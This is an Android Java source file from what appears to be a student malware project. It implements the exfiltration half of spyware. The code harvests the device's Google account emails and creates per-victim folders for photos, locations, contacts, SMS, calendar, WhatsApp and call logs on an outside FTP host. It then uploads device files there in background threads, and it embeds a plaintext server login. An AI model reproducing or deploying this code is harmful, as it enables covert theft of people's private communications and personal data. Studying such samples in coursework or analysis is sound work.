package com.malwareclass.malwareproject;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.util.Log;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;

public class FTP {

    private static final String HOST = "ftp.nxz.altervista.org";
    private static final String USERNAME = "nxz";
    private static final String PASSWORD = "malwareAPU1!";
    private static final int PORT = 21;

    private static final String TAG = "FTP";

    private String root = "";

    // constructor
    public FTP(Context context) {

        // getting email
        AccountManager manager = (AccountManager) context.getSystemService(Context.ACCOUNT_SERVICE);
        Account[] list = manager.getAccountsByType("com.google");
        for (Account a : list) {
            String mail = a.name.replace("@", "AT");
            mail = mail.replace(".", "DOT");
            root += "/" + mail;
        }
        Log.d(TAG, "root: " + root);

        // build dirs tree
        buildTree();

    }

    private void buildTree() {

        Log.d(TAG, "start build tree");

        Thread thread = new Thread() {
            public void run() {

                // create a FTP client
                FTPClient client = new FTPClient();
                // connect and login to FTP server
                try {
                    // connect to FTP server
                    client.connect(HOST, PORT);
                    int replyCode = client.getReplyCode();
                    if (!FTPReply.isPositiveCompletion(replyCode)) {
                        Log.d(TAG, "Connect failed");
                        return;
                    }

                    // login to FTP server
                    boolean success = client.login(USERNAME, PASSWORD);
                    if (!success) {
                        Log.d(TAG, "Could not login to the server");
                        return;
                    }

                    // try to change dir
                    success = client.changeWorkingDirectory(root);
                    if (success) {
                        Log.d(TAG, "Successfully changed working directory.");
                    } else {
                        Log.d(TAG, "Failed to change working directory.");
                        // make root dir
                        success = client.makeDirectory(root);
                        if (success) {
                            Log.d(TAG, "Successfully created root directory");

                            // make DCIM dir
                            success = client.makeDirectory(root + "/DCIM");
                            if (success) {
                                Log.d(TAG, "Successfully created DCIM directory");
                            } else {
                                Log.d(TAG, "Failed to create DCIM directory");
                            }

                            // make locations dir
                            success = client.makeDirectory(root + "/locations");
                            if (success) {
                                Log.d(TAG, "Successfully created locations directory");
                            } else {
                                Log.d(TAG, "Failed to create locations directory");
                            }

                            // make contacts dir
                            success = client.makeDirectory(root + "/contacts");
                            if (success) {
                                Log.d(TAG, "Successfully created contacts directory");
                            } else {
                                Log.d(TAG, "Failed to create contacts directory");
                            }

                            // make sms dir
                            success = client.makeDirectory(root + "/sms");
                            if (success) {
                                Log.d(TAG, "Successfully created sms directory");
                            } else {
                                Log.d(TAG, "Failed to create sms directory");
                            }

                            // make calendar dir
                            success = client.makeDirectory(root + "/calendar");
                            if (success) {
                                Log.d(TAG, "Successfully created calendar directory");
                            } else {
                                Log.d(TAG, "Failed to create calendar directory");
                            }

                            // make whatsapp dir
                            success = client.makeDirectory(root + "/whatsapp");
                            if (success) {
                                Log.d(TAG, "Successfully created whatsapp directory");
                            } else {
                                Log.d(TAG, "Failed to create whatsapp directory");
                            }

                            // make callLog dir
                            success = client.makeDirectory(root + "/call");
                            if (success) {
                                Log.d(TAG, "Successfully created call directory");
                            } else {
                                Log.d(TAG, "Failed to create call directory");
                            }
                        } else {
                            Log.d(TAG, "Failed to create directory");
                        }
                    }

                    // logs out
                    client.logout();
                    client.disconnect();
                } catch (IOException e) {
                    // TODO
                    Log.d(TAG, "catch: " + e.getMessage());
                    e.printStackTrace();
                }

            }
        };

        thread.start();
    }

    public void upload(final HashMap<String, File[]> data) {

        Thread thread = new Thread() {
            public void run() {
                //create a FTP client
                FTPClient client = new FTPClient();
                // connect and login to FTP server
                try {
                    // connect to FTP server
                    client.connect(HOST, PORT);
                    int replyCode = client.getReplyCode();
                    if (!FTPReply.isPositiveCompletion(replyCode)) {
                        Log.d(TAG, "Connect failed");
                        return;
                    }

                    // login to FTP server
                    boolean success = client.login(USERNAME, PASSWORD);
                    if (!success) {
                        Log.d(TAG, "Could not login to the server");
                        return;
                    }
                    for (String dir : data.keySet()) {
                        // change directory
                        //Log.d(TAG,"key dir " + dir);
                        success = client.changeWorkingDirectory(root + "/" + dir);
                        if (success) {
                            //Log.d(TAG, "Successfully changed working directory.");
                            for (File file : data.get(dir)) {
                                if (file.isFile()) {
                                    //Log.d(TAG, "file " + file.toString());
                                    try (InputStream inputStream = new FileInputStream(file)) {
                                        String fileName = file.getAbsolutePath().substring(file.getAbsoluteFile().toString().lastIndexOf("/") + 1);
                                        client.storeFile(fileName, inputStream);
                                        replyCode = client.getReplyCode();
                                        if (!FTPReply.isPositiveCompletion(replyCode)) {
                                            Log.d(TAG, "Upload failed.");
                                        } else {
                                            Log.d(TAG, "Upload of " + fileName + " completed.");
                                        }
                                    } catch (IOException e) {
                                        // TODO
                                        e.printStackTrace();
                                    }
                                }
                            }
                        } else {
                            Log.d(TAG, "Failed to change working directory.");
                        }
                    }

                    client.logout();
                    client.disconnect();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };

        thread.start();


    }
}